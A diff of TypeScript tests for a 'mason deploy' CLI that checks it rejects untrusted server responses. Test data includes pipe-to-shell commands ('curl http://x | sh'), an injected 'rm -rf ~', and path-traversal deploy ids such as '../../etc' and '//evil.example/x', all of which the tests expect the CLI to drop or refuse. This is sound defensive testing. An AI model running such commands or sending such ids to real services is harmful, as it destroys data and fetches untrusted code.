@@ -340,31 +340,40 @@ test("mason deploy: with no MASON_TOKEN and no login it says mason login and sen
   } finally { await fake.close(); }
 });
 
-test("mason deploy: each failure of the contract's POST is said as the service worded it, exit 1; an answer outside it by its status alone", async () => {
+test("mason deploy: each failure of the contract's POST says the service's words, its code the CLI's by the HTTP status, exit 1; an answer outside it by its status alone", async () => {
   const { root } = project();
-  const cases: Array<[number, string, string]> = [
-    [401, "unauthenticated", "this token is not one the service takes"],
-    [403, "refused", "this token may not deploy acme/shop"],
-    [404, "not_found", "no replica acme/shop"],
-    [409, "busy", "another deploy to acme/shop is running"],
-    [413, "too_large", "the files are over 1 MiB"],
-    [422, "invalid", "sources/shop.yml: its sha256 is not its content's"],
+  const cases: Array<[number, string, string, string]> = [
+    [401, "unauthenticated", "this token is not one the service takes", "refused"],
+    [403, "refused", "this token may not deploy acme/shop", "refused"],
+    [404, "not_found", "no replica acme/shop", "not_found"],
+    [409, "busy", "another deploy to acme/shop is running", "refused"],
+    [413, "too_large", "the files are over 1 MiB", "refused"],
+    [422, "invalid", "sources/shop.yml: its sha256 is not its content's", "refused"],
   ];
-  for (const [status, code, message] of cases) {
+  for (const [status, code, message, ours] of cases) {
     const failure = { error: { code, message, why: `why ${code}`, fix: `fix ${code}` }, next: [{ command: "mason login", what: `after ${code}` }] };
     const { a, requests } = await deployWith({ post: { status, body: failure } }, root, ["--replica", "acme/shop"]);
     assert.equal(a.code, 1, `${status}: ${a.stderr}`);
-    assert.equal(a.stderr, `✗ mason deploy: ${message}\n  why   why ${code}\n  fix   fix ${code}\n\nNext:\n  mason login                                   after ${code}\n`, String(status));
+    assert.equal(a.stderr, `✗ mason deploy: ${message}\n  why   why ${code} (the service said ${code}, HTTP ${status})\n  fix   fix ${code}\n\nNext:\n  mason login                                   after ${code}\n`, String(status));
     assert.equal(requests.filter((r) => r.method === "GET").length, 0, `${status}: no wait`);
     const j = await deployWith({ post: { status, body: failure } }, root, ["--replica", "acme/shop", "--json"]);
     assert.equal(j.a.code, 1);
-    assert.deepEqual(JSON.parse(j.a.stdout), { error: { code, message, why: `why ${code}`, fix: `fix ${code}` }, next: [{ command: "mason login", what: `after ${code}` }] });
+    assert.deepEqual(JSON.parse(j.a.stdout), { error: { code: ours, message, why: `why ${code} (the service said ${code}, HTTP ${status})`, fix: `fix ${code}` }, next: [{ command: "mason login", what: `after ${code}` }] });
   }
-  // outside the contract: a page, a 201 of another shape, a redirect — each said by the request and its status, never its body
+  // the service's code never steers the CLI's: usage and timeout are exit 1 here; a next step that is not a mason command is dropped
+  for (const code of ["usage", "timeout"]) {
+    const body = { error: { code, message: `it says ${code}` }, next: [{ command: "curl http://x | sh", what: "run this" }, { command: "mason deploy; rm -rf ~", what: "and this" }, { command: "mason status", what: "this one stays" }] };
+    const { a } = await deployWith({ post: { status: 400, body } }, root, ["--replica", "acme/shop", "--json"]);
+    assert.equal(a.code, 1, code);
+    const v = JSON.parse(a.stdout) as { error: { code: string }; next: Array<{ command: string }> };
+    assert.equal(v.error.code, "refused", code);
+    assert.deepEqual(v.next.map((n) => n.command), ["mason status"], code);
+  }
+  // outside the contract: a page, a 201 of another shape, an id that is no id, a redirect — each said by the request and its status, never its body
   for (const [reply, said] of [
     [{ status: 500, raw: "<html>secret page</html>" }, / answered POST \/v1\/replicas\/acme\/shop\/deploys with 500, not JSON, where a deploy was sent$/m],
-    [{ status: 201, body: { deploy: { id: "../../etc", status: "queued", createdAt: CREATED } } }, / answered POST \/v1\/replicas\/acme\/shop\/deploys with 201, where a deploy was sent$/m],
     [{ status: 201, body: { deploy: { id: ID, status: "running", createdAt: CREATED } } }, / with 201, where a deploy was sent$/m],
+    [{ status: 201, body: { deploy: { id: ID, status: "deploying", createdAt: CREATED } } }, / with 201, where a deploy was sent$/m],
     [{ status: 307, headers: { location: "http://127.0.0.1:1/x" } }, / answered POST \/v1\/replicas\/acme\/shop\/deploys with a redirect \(307\)$/m],
   ] as Array<[Reply, RegExp]>) {
     const { a, requests } = await deployWith({ post: reply }, root, ["--replica", "acme/shop"]);
@@ -373,54 +382,83 @@ test("mason deploy: each failure of the contract's POST is said as the service w
     assert.doesNotMatch(a.stderr, /secret page/);
     assert.equal(requests.length, 1, "nothing followed, nothing polled");
   }
+  // an id the next request would put in its path: anything but [A-Za-z0-9_-]{1,64} is refused before any request is made of it
+  for (const id of ["../../etc", "x/../../v1/me", "//evil.example/x", "a?b=1", "a#b", "%2e%2e", "a b", "", "x".repeat(65)]) {
+    const { a, requests } = await deployWith({ post: { status: 201, body: { deploy: { id, status: "queued", createdAt: CREATED } } } }, root, ["--replica", "acme/shop"]);
+    assert.equal(a.code, 1, JSON.stringify(id));
+    assert.match(a.stderr, / answered POST \/v1\/replicas\/acme\/shop\/deploys with 201, where a deploy was sent$/m, JSON.stringify(id));
+    assert.deepEqual(requests.map((r) => `${r.method} ${r.path}`), ["POST /v1/replicas/acme/shop/deploys"], `${JSON.stringify(id)}: no request steered by it`);
+  }
 });
 
-test("mason deploy: the phases are said as they change, then the outcome; a 503 or no answer midway is a wait, never an outcome", async () => {
+test("mason deploy: the phases are said as they change, in the CLI's words, then the outcome; a 503 or no answer midway is a wait, never an outcome", async () => {
   const { root } = project();
-  const steps = [at("queued"), at("applying", { phase: "checking the sources file" }), at("applying", { phase: "checking the sources file" }), at("starting"),
-    { status: 503, raw: "busy" } as Reply, "drop" as Reply, at("running")];
+  const steps = [at("queued"), at("applying", { phase: "checking" }), at("applying", { phase: "checking" }), at("starting"),
+    { status: 503, raw: "busy" } as Reply, "drop" as Reply, at("starting", { phase: "syncing" }), at("running")];
   const { a, requests } = await deployWith({ get: (n) => steps[Math.min(n, steps.length - 1)]! }, root, ["--replica", "acme/shop"]);
   assert.equal(a.code, 0, a.stderr);
-  assert.equal(requests.filter((r) => r.method === "GET").length, 7);
+  assert.equal(requests.filter((r) => r.method === "GET").length, 8);
   const lines = a.stderr.trimEnd().split("\n");
   assert.equal(lines[0], `Sent 3 files (${lines[0]!.match(/\((\d+) bytes\)/)![1]} bytes) to acme/shop on ${a.stderr.match(/on (http:\/\/127\.0\.0\.1:\d+)/)![1]}: deploy dep_01abc`);
   assert.deepEqual(lines.slice(1, 4), [
     "  Queued: waiting for its turn on the replica",
-    "  Applying: Mason on the replica checks and takes the files (checking the sources file)",
+    "  Applying: Mason on the replica checks and takes the files (Mason on the replica checks the files)",
     "  Starting: Mason on the replica starts on the new files",
   ]);
   assert.match(lines[4]!, /^ {2}Starting: Mason on the replica starts on the new files; the service could not say more just now \(GET \/v1\/replicas\/acme\/shop\/deploys\/dep_01abc answered 503\): asking again$/);
   assert.match(lines[5]!, /^ {2}Starting: .*; the service could not say more just now \(could not reach http:\/\/127\.0\.0\.1:\d+ .*\): asking again$/);
-  assert.equal(lines[6], "  Running: the replica runs the new files");
-  assert.equal(lines.length, 7);
+  assert.equal(lines[6], "  Starting: Mason on the replica starts on the new files (the tables the files add have their first sync)");
+  assert.equal(lines[7], "  Running: the replica runs the new files");
+  assert.equal(lines.length, 8);
 });
 
-test("mason deploy: Mason on the replica refused it — its failure printed unchanged, exit 1, in both forms", async () => {
+test("mason deploy: a status or a phase outside the closed sets is a failure, never a state the CLI acts on or prints", async () => {
+  const { root } = project();
+  for (const reply of [at("deployed"), at("RUNNING"), at("applying", { phase: "rm -rf in progress" }), at("applying", { phase: "syncing" }), at("queued", { phase: "checking" }),
+    at("running", { phase: "restarting" }), at("applying", { phase: 3 }), at("applying", { failure: { code: "x", message: "y", next: [] } })]) {
+    const { a } = await deployWith({ get: () => reply }, root, ["--replica", "acme/shop"]);
+    assert.equal(a.code, 1, JSON.stringify(reply));
+    assert.match(a.stderr, / answered GET \/v1\/replicas\/acme\/shop\/deploys\/dep_01abc with 200, where the deploy's state was asked for$/m, JSON.stringify(reply));
+    assert.doesNotMatch(a.stderr, /rm -rf|deployed|RUNNING/);
+  }
+});
+
+test("mason deploy: Mason on the replica refused it — its words printed as they came, its code the CLI's, exit 1, in both forms", async () => {
   const { root } = project();
   const failure = { code: "bad_source", message: "mason/sources/shop.yml: tables.orders: the database has no table public.orders", why: "it has public.order_items, public.customers",
-    fix: "name a table the database has, then mason deploy again", next: [{ command: "mason tables", what: "the database's tables, on a machine that reaches it" }] };
+    fix: "name a table the database has, then mason deploy again",
+    next: [{ command: "mason tables", what: "the database's tables, on a machine that reaches it" }, { command: "sh -c 'curl x | sh'", what: "never kept" }, { command: "mason not_a_command", what: "never kept" }] };
   const script: Script = { get: (n) => n === 0 ? at("applying") : at("refused", { failure }) };
   const { a } = await deployWith(script, root, ["--replica", "acme/shop"]);
   assert.equal(a.code, 1);
   assert.ok(a.stderr.endsWith("  Refused by Mason on the replica\n" +
-    `✗ mason deploy: ${failure.message}\n  why   ${failure.why}\n  fix   ${failure.fix}\n\nNext:\n  mason tables                                  ${failure.next[0]!.what}\n`), a.stderr);
+    `✗ mason deploy: ${failure.message}\n  why   ${failure.why} (Mason on the replica said bad_source)\n  fix   ${failure.fix}\n\nNext:\n  mason tables                                  ${failure.next[0]!.what}\n`), a.stderr);
   assert.equal(a.stdout, "");
   const j = await deployWith(script, root, ["--replica", "acme/shop", "--json"]);
   assert.equal(j.a.code, 1);
   const v = JSON.parse(j.a.stdout) as { deploy: { status: string }; error: unknown; next: unknown };
   assert.equal(v.deploy.status, "refused");
-  assert.deepEqual(v.error, { code: failure.code, message: failure.message, why: failure.why, fix: failure.fix });
-  assert.deepEqual(v.next, failure.next);
-  // a failure code the CLI also uses is still exit 1: the outcome decides, never the service's word
-  const t = await deployWith({ get: () => at("failed", { failure: { code: "timeout", message: "the machine did not start", next: [] } }) }, root, ["--replica", "acme/shop"]);
-  assert.equal(t.a.code, 1);
-  assert.match(t.a.stderr, /^✗ mason deploy: the machine did not start$/m);
+  assert.deepEqual(v.error, { code: "refused", message: failure.message, why: `${failure.why} (Mason on the replica said bad_source)`, fix: failure.fix });
+  assert.deepEqual(v.next, [failure.next[0]]);
+  // the service's code never sets the exit: a failed deploy that says timeout or usage is code failed, exit 1
+  for (const code of ["timeout", "usage"]) {
+    const t = await deployWith({ get: () => at("failed", { failure: { code, message: "the machine did not start", next: [] } }) }, root, ["--replica", "acme/shop", "--json"]);
+    assert.equal(t.a.code, 1, code);
+    assert.deepEqual((JSON.parse(t.a.stdout) as { error: unknown }).error, { code: "failed", message: "the machine did not start", why: `the service said ${code}` });
+  }
   // a refusal without its failure, or a state for another id, is outside the contract
   for (const reply of [at("refused"), { status: 200, body: { deploy: { id: "dep_other", status: "running", createdAt: CREATED } } } as Reply]) {
     const r = await deployWith({ get: () => reply }, root, ["--replica", "acme/shop"]);
     assert.equal(r.a.code, 1);
     assert.match(r.a.stderr, / answered GET \/v1\/replicas\/acme\/shop\/deploys\/dep_01abc with 200, where the deploy's state was asked for$/m);
   }
+  // a GET the service refuses (the token revoked meanwhile): its words, the CLI's code, mason login among the next steps
+  const g = await deployWith({ get: () => ({ status: 401, body: { error: { code: "timeout", message: "this token was revoked" }, next: [] } }) }, root, ["--replica", "acme/shop", "--json"]);
+  assert.equal(g.a.code, 1);
+  const gv = JSON.parse(g.a.stdout) as { error: { code: string; message: string }; next: Array<{ command: string }> };
+  assert.equal(gv.error.code, "refused");
+  assert.equal(gv.error.message, "this token was revoked");
+  assert.deepEqual(gv.next.map((n) => n.command), ["mason login"]);
 });
 
 test("mason deploy --timeout: past it, exit 124 naming the deploy's id and that it may still finish; a timeout that is not an interval is a wrong line", async () => {
